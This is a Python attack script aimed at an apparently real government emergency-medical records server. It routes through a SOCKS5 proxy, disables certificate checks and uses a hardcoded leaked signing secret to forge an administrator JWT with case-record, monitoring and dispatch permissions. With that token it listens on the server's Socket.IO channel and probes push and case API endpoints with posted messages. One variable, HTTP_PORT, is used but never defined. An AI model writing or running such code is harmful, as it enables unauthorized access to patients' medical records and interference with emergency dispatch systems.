#!/usr/bin/env python3
"""
EPCR push verify v2 — single authenticated listener
Handshake → CONNECT with JWT → long-poll cycle (5 rounds, 15s each)
Logs every packet type received from server.
"""
import requests, json, time, re, datetime
import jwt as pyjwt
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import warnings
warnings.filterwarnings("ignore")

PROXY_HOST = "202.160.76.157"
PROXY_PORT = 11081
JWT_SECRET = "ru/3xu4dkru4888"
SERVER = "epcr.tpf.gov.tw"
SOCKET_PORT = 4004
S = {"https": f"socks5://{PROXY_HOST}:{PROXY_PORT}"}

def forge_jwt(account="admin", role="ADMIN", user_id=1):
    now = datetime.datetime.now(datetime.timezone.utc)
    return pyjwt.encode({
        "sub": str(user_id), "account": account, "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + datetime.timedelta(hours=48)).timestamp()),
        "permissions": [
            "DOCTOR_TEST_PUSH", "EPCR_PAGE_CASELIST", "EPCR_CASERECORD_READ",
            "MONITOR_ALL", "AUTH_ROLE", "AUTH_USER", "MCI_DISPATCH",
            "HOSPITAL_PAGE_DISPATCH", "EPCR_PAGE_OHCACASELIST",
        ],
    }, JWT_SECRET, algorithm="HS256")

# 1. Handshake
sess = requests.Session()
sess.proxies = S
sess.verify = False

resp = sess.get(
    f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
    params={"EIO": "4", "transport": "polling", "t": str(int(time.time()*1000))},
    timeout=10,
)
sid = re.search(r'"sid":"([^"]+)"', resp.text).group(1)
print(f"[1] Handshake: HTTP {resp.status_code}")
open_pkt = re.search(r'(\\d+:\\{[^}]+\\})', resp.text)
print(f"    Body: {open_pkt.group(1)[:100] if open_pkt else resp.text[:100]}")
print(f"    Sid: {sid}")

# 2. CONNECT with forged JWT
token = forge_jwt()
print(f"[2] JWT forged (claims: sub=1, account=admin, role=ADMIN, 8 permissions)")
connect_msg = f'40{{"token":"{token}"}}'
connect_data = f"{len(connect_msg)}:{connect_msg}"
resp2 = sess.post(
    f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
    params={"EIO": "4", "transport": "polling", "sid": sid, "t": str(int(time.time()*1000))},
    data=connect_data,
    headers={"Content-Type": "text/plain;charset=utf-8"},
    timeout=10,
)
print(f"[2] CONNECT: HTTP {resp2.status_code} — '{resp2.text}'")

# 3. Long-poll cycle — 5 rounds
print(f"[3] Starting long-poll cycle (5 rounds, 15s timeout each)...")
for i in range(5):
    t_start = time.time()
    try:
        resp = sess.get(
            f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
            params={"EIO": "4", "transport": "polling", "sid": sid, "t": str(int(time.time()*1000))},
            timeout=15,
        )
        elapsed = time.time() - t_start
        ts = time.strftime("%H:%M:%S")
        print(f"  [{ts}] Poll {i+1}: HTTP {resp.status_code} ({elapsed:.1f}s)")
        
        if resp.status_code == 200:
            body = resp.text
            if body:
                # Parse Engine.IO packets
                pos = 0
                while pos < len(body):
                    m = re.match(r'(\d+):(.*)', body[pos:])
                    if not m:
                        # Might be a single-byte packet (PING/PONG)
                        if body[pos] in ('2', '3'):
                            name = {"2":"PING","3":"PONG"}.get(body[pos], body[pos])
                            print(f"    → Engine.IO {name}")
                            pos += 1
                            continue
                        break
                    plen = int(m.group(1))
                    payload = m.group(2)[:plen]
                    pos += len(m.group(0)) - len(m.group(0)[len(m.group(1))+1+plen:])
                    
                    if payload.startswith("0"):
                        print(f"    → Open/CONNECT")
                    elif payload.startswith("2"):
                        print(f"    → PING")
                    elif payload.startswith("3"):
                        print(f"    → PONG")
                    elif payload.startswith("4"):
                        siotype = payload[1] if len(payload) > 1 else "?"
                        names = {"0":"CONNECT","1":"DISCONNECT","2":"EVENT","3":"ACK","4":"CONNECT_ERROR"}
                        print(f"    → ✅ Socket.IO {names.get(siotype, '?')}: {payload[2:][:300]}")
                    else:
                        print(f"    → Data: {payload[:200]}")
            else:
                print(f"    → (empty body)")
        elif resp.status_code == 400:
            print(f"    → ❌ {resp.text[:200]}")
            print("    → Session invalidated — cannot continue polling")
            break
    except requests.exceptions.ReadTimeout:
        elapsed = time.time() - t_start
        print(f"  [timeout] Poll {i+1}: held open {elapsed:.1f}s (no events)")
    except Exception as e:
        print(f"  [error] Poll {i+1}: {e}")
        break

# 4. Also try HTTP API push endpoints on port 4000
print(f"\n[4] Testing HTTP API on port {HTTP_PORT} with forged JWT...")
for endpoint in ["/api/case/push", "/api/push", "/api/notify", "/DispatchRecords", "/api/case"]:
    try:
        r = sess.post(
            f"https://{SERVER}:{HTTP_PORT}{endpoint}",
            json={"caseId": "T1", "message": "test push"},
            headers={"Authorization": f"Bearer {token}"},
            proxies=S, verify=False, timeout=5,
        )
        print(f"  POST {endpoint}: HTTP {r.status_code} — {r.text[:80]}")
    except Exception as e:
        print(f"  POST {endpoint}: Error — {e}")

for endpoint in ["/api/case/push", "/api/push", "/api/notify", "/api/case"]:
    try:
        r = sess.get(
            f"https://{SERVER}:{HTTP_PORT}{endpoint}",
            headers={"Authorization": f"Bearer {token}"},
            proxies=S, verify=False, timeout=5,
        )
        print(f"  GET {endpoint}: HTTP {r.status_code} — {r.text[:80]}")
    except Exception as e:
        print(f"  GET {endpoint}: Error — {e}")

print("\n=== Done ===")
